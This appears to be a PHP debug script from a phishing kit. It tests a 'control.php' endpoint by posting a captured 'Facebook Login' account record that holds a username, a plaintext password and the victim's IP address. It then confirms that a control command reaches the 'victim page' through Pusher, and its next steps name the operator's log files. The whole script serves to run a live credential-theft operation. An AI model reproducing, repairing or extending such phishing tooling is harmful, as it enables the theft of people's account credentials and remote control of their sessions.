<?php
// debug-control.php - Debug script để test control.php

// Dữ liệu thực tế từ dashboard
$testData = [
    "type" => "new_account",
    "data" => [
        "account" => [
            "id" => "300993979",
            "username" => "gdfhdfu@gmail.com",
            "password" => "dfhdfh",
            "email" => "gdfhdfu@gmail.com",
            "website" => 3,
            "website_title" => "Facebook Login",
            "ip_address" => "14.161.125.100",
            "status" => "pending",
            "content" => "{\"Data\":\"Nothing\"}",
            "created_at" => "2025-09-27T05:10:13.198Z"
        ],
        "timestamp" => "2025-09-27T05:38:02.651Z",
        "fieldIds" => [5]
    ]
];

echo "<h1>Debug Control.php</h1>";

// Test 1: Kiểm tra website ID extraction
echo "<h2>Test 1: Website ID Extraction</h2>";
echo "<pre>";
echo "Input data:\n";
echo json_encode($testData, JSON_PRETTY_PRINT);
echo "\n\n";

// Simulate the logic from control.php
$websiteId = null;
if (isset($testData['website'])) {
    $websiteId = $testData['website'];
    echo "Found website ID in \$input['website']: $websiteId\n";
} elseif (isset($testData['data']['account']['website'])) {
    $websiteId = $testData['data']['account']['website'];
    echo "Found website ID in \$input['data']['account']['website']: $websiteId\n";
} else {
    echo "ERROR: No website ID found!\n";
}

echo "Final website ID: " . ($websiteId ?? 'NULL') . "\n";
echo "</pre>";

// Test 2: Gửi request đến control.php
echo "<h2>Test 2: Send Request to control.php</h2>";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . '/control.php');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($testData));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

echo "<p><strong>HTTP Code:</strong> $httpCode</p>";

if ($error) {
    echo "<p><strong>cURL Error:</strong> $error</p>";
}

echo "<p><strong>Response:</strong></p>";
echo "<pre>" . htmlspecialchars($response) . "</pre>";

// Test 3: Parse response
echo "<h2>Test 3: Parse Response</h2>";
$responseData = json_decode($response, true);

if ($responseData) {
    echo "<p><strong>Parsed Response:</strong></p>";
    echo "<pre>" . json_encode($responseData, JSON_PRETTY_PRINT) . "</pre>";
    
    if (isset($responseData['control_sent']) && $responseData['control_sent']) {
        echo "<div style='background: #d4edda; color: #155724; padding: 15px; border-radius: 5px;'>";
        echo "✅ <strong>SUCCESS!</strong> Control command sent successfully!";
        echo "</div>";
    } else {
        echo "<div style='background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px;'>";
        echo "❌ <strong>ERROR!</strong> " . ($responseData['error'] ?? 'Unknown error');
        echo "</div>";
    }
} else {
    echo "<div style='background: #fff3cd; color: #856404; padding: 15px; border-radius: 5px;'>";
    echo "⚠️ <strong>WARNING!</strong> Response is not valid JSON";
    echo "</div>";
}

echo "<h2>Next Steps:</h2>";
echo "<ol>";
echo "<li>If successful, check <code>index.php</code> (victim page) to see if it receives the control command</li>";
echo "<li>Check browser console in victim page for Pusher messages</li>";
echo "<li>Check log files: <code>control_logs.txt</code> and <code>pusher_logs.txt</code></li>";
echo "</ol>";
?>
